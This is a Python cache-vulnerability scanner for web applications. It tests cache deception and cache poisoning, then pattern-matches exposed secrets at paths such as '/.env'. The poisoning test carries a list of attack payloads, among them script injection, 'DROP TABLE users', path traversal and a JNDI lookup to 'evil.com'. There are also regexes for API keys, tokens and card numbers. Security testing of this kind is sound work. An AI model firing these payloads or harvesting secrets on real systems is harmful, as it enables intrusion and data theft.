
import requests
import hashlib
import time
import re
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor

class CacheVulnerabilityScanner:
    def __init__(self, target_url, auth_token=None):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()
        if auth_token:
            self.session.headers.update({'Authorization': f'Bearer {auth_token}'})
        self.vulnerabilities = []
    
    def test_cache_deception(self):
        """Test if private endpoints can be cached as static files"""
        
        test_endpoints = [
            '/api/user/profile',      # Private user data
            '/account/settings',      # User settings
            '/dashboard/stats',       # User-specific stats
            '/api/messages/inbox',    # Private messages
        ]
        
        fake_extensions = ['.css', '.js', '.jpg', '.png', '.json', '.xml']
        
        for endpoint in test_endpoints:
            for ext in fake_extensions:
                # Try to trick cache with fake extension
                test_url = f"{self.target}{endpoint}{ext}"
                
                # First request (should be cache miss)
                r1 = self.session.get(test_url)
                cache_status_1 = r1.headers.get('X-Cache', r1.headers.get('CF-Cache-Status', ''))
                
                # Second request (might be cache hit)
                r2 = self.session.get(test_url)
                cache_status_2 = r2.headers.get('X-Cache', r2.headers.get('CF-Cache-Status', ''))
                
                # If it got cached and contains private data
                if 'HIT' in cache_status_2 and len(r2.text) > 100:
                    # Check if response contains user-specific data
                    if any(keyword in r2.text.lower() for keyword in ['email', 'token', 'session', 'user']):
                        self.vulnerabilities.append({
                            'type': 'Cache Deception',
                            'url': test_url,
                            'evidence': f"Cached private data: {r2.text[:200]}",
                            'severity': 'HIGH'
                        })
                        print(f"VULNERABLE: {test_url}")
                        print(f"   Exposed data: {r2.text[:100]}...")
    
    def test_cache_poisoning(self):
        """Test if cache accepts malicious inputs"""
        
        payloads = [
            '"><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            "'; DROP TABLE users; --",
            '../../../etc/passwd',
            '${jndi:ldap://evil.com/a}',
        ]
        
        for payload in payloads:
            test_url = f"{self.target}/search?q={payload}"
            
            # Send malicious request
            malicious_response = self.session.get(test_url)
            
            # Check if payload appears in cache headers or response
            if payload in malicious_response.text:
                # See if it persists across users
                clean_session = requests.Session()
                clean_response = clean_session.get(test_url)
                
                if payload in clean_response.text:
                    self.vulnerabilities.append({
                        'type': 'Cache Poisoning',
                        'url': test_url,
                        'payload': payload,
                        'severity': 'CRITICAL'
                    })
                    print(f"CACHE POISONED with: {payload[:50]}")
                    
                    # This payload now affects ALL users!
    
    def scan_for_sensitive_cached_data(self):
        """Actively search for sensitive data in cached responses"""
        
        sensitive_patterns = {
            'API Keys': r'[a-zA-Z0-9]{32,}',
            'JWT Tokens': r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+',
            'Passwords': r'password[\'"]?\s*[:=]\s*[\'"]?[^\'"]+[\'"]?',
            'AWS Keys': r'AKIA[0-9A-Z]{16}',
            'Private Keys': r'-----BEGIN (RSA|DSA|EC) PRIVATE KEY-----',
            'Credit Cards': r'\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b',
            'SSN': r'\b\d{3}-\d{2}-\d{4}\b',
            'Internal IPs': r'\b(10|172|192)\.\d+\.\d+\.\d+\b',
        }
        
        # False positive filters
        false_positive_patterns = {
            'Google Site Verification': r'google-site-verification.*content="[^"]*"',
            'Meta Tags': r'<meta[^>]*content="[^"]{32,}[^"]*"',
            'Analytics IDs': r'GA_MEASUREMENT_ID|G-[A-Z0-9]+',
        }
        
        # Common URLs that might have cached sensitive data
        scan_targets = [
            '/',
            '/api/health',
            '/status',
            '/config',
            '/.env',
            '/debug',
            '/metrics',
            '/info',
            '/robots.txt',
            '/sitemap.xml',
        ]
        
        for path in scan_targets:
            response = self.session.get(f"{self.target}{path}")
            
            for data_type, pattern in sensitive_patterns.items():
                matches = re.findall(pattern, response.text, re.IGNORECASE)
                
                if matches:
                    self.vulnerabilities.append({
                        'type': f'Exposed {data_type}',
                        'url': f"{self.target}{path}",
                        'matches': matches[:5],  # First 5 matches
                        'severity': 'CRITICAL'
                    })
                    print(f"FOUND {data_type}: {matches[0][:50]}...")
                    print(f"   Location: {self.target}{path}")
    
    def run_full_scan(self):
        """Execute all cache vulnerability tests"""
        
        print(f"Scanning {self.target} for cache vulnerabilities...")
        print("=" * 60)
        
        self.test_cache_deception()
        self.test_cache_poisoning()
        self.scan_for_sensitive_cached_data()
        
        # Report findings
        print("\n" + "=" * 60)
        print(f"SCAN COMPLETE - Found {len(self.vulnerabilities)} issues")
        
        for vuln in self.vulnerabilities:
            print(f"\n[{vuln['severity']}] {vuln['type']}")
            print(f"  URL: {vuln['url']}")
            if 'evidence' in vuln:
                print(f"  Evidence: {vuln['evidence'][:100]}")
        
        return self.vulnerabilities


if __name__ == "__main__":
    
    scanner = CacheVulnerabilityScanner("https://localhost:8000")
    results = scanner.run_full_scan()
    
 